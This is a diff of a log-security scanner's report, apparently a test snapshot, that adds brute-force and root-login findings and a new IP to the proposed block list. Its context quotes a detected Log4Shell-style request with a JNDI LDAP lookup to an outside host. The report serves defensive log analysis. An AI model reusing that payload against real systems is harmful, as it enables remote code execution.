@@ -1,8 +1,8 @@
 NEXO SENTINEL - security report of the logs
 
-Scanned 5 logs and 96 lines (96 new); skipped 3.
-Findings: 31 (high 14, medium 14, low 3); suppressed 1
-Sources: 16; to look at now (P1): 3
+Scanned 6 logs and 107 lines (107 new); skipped 3.
+Findings: 33 (high 16, medium 14, low 3); suppressed 1
+Sources: 17; to look at now (P1): 4
 
 SKIPPED
   logs/binary.log         Invalid data: the file "logs/binary.log" is not UTF-8
@@ -42,12 +42,15 @@ FINDINGS
   high      SEN-108  jndi_injection        yes   logs/nginx.log:5       198.51.100.210   GET /search?q=${jndi:ldap://203.0.113.200/a} 200 "curl/8.5.0"
   high      SEN-205  foreign_object        no    logs/nginx.log:6       198.51.100.220   user 42 was answered an object of user 57: GET /api/users/57/cards 200 "python-requests/2.32" user=42
   medium    SEN-106  scanner               yes   logs/nginx.log:9       198.51.100.230   GET / 200 "Nikto/2.5.0"
+  high      SEN-201  brute_force           yes   logs/auth.log:8        203.0.113.77     5 failed logins
+  high      SEN-202  login_after_failures  yes   logs/auth.log:10       203.0.113.77     accepted after 6 failed logins: sshd login accepted user=root
 
 SOURCES
   PRI  ADDRESS          SCORE  PROPOSAL   FIRST                       LAST                        TACTICS
   P1   198.51.100.140   24     block      2026-11-02T09:21:10Z        2026-11-02T09:21:12Z        Initial Access, Reconnaissance
   P1   203.0.113.9      20     block      2026-11-02T09:14:06Z        2026-11-02T09:20:01Z        Credential Access, Initial Access
   P1   198.51.100.210   20     block      02/Nov/2026:10:31:00 +0000  02/Nov/2026:10:31:02 +0000  Credential Access, Initial Access
+  P1   203.0.113.77     20     block      Nov  2 12:01:04             Nov  2 12:01:30             Credential Access, Initial Access
   P2   198.51.100.23    20     block      2026-11-02T09:15:10Z        2026-11-02T09:15:12Z        Initial Access
   P2   192.0.2.10       10     protected  2026-11-02T09:17:30Z        2026-11-02T09:17:30Z        Initial Access
   P3   198.51.100.180   10     review     2026-11-02T09:30:07Z        2026-11-02T09:30:07Z        Collection
@@ -85,5 +88,5 @@ RECOMMENDED
   SEN-303  malformed_line        Check what writes this log; a broken line can hide an entry. (CWE-117)
 
 The report is in report.json.
-Ask the local model for a summary? (yes/no) Proposed: block 198.51.100.140, 203.0.113.9, 198.51.100.210, 198.51.100.23 on the firewall.
+Ask the local model for a summary? (yes/no) Proposed: block 198.51.100.140, 203.0.113.9, 198.51.100.210, 203.0.113.77, 198.51.100.23 on the firewall.
 Block them? (yes/no) Nothing was changed.
